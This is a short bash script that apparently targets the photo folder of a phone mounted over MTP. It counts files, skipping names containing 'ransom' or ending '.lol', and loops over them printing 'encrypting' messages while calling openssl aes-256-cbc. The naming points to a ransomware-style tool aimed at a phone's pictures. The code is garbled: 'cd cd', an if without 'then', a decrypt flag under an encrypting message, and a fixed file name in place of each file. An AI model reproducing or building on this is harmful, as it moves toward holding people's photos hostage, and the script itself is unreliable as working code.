#!/bin/bash

PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/CameraDev)
LOCALPATH=$(pwd)




cd cd "$PHONEPATH"
currentfile=1
filecount=$(ls -1 | grep -v "ransom" | grep -v ".lol" | wc -l)
 
for f in *
do 
	
	if [[ $f = *".lol" ]];
		echo "encrypting $f ($currentfile/$filecount)..."
		openssl aes-256-cbc -d -a -in secrets.txt.enc -out secrets.txt.new

		currentfile=$((currentfile+1))
	fi

done
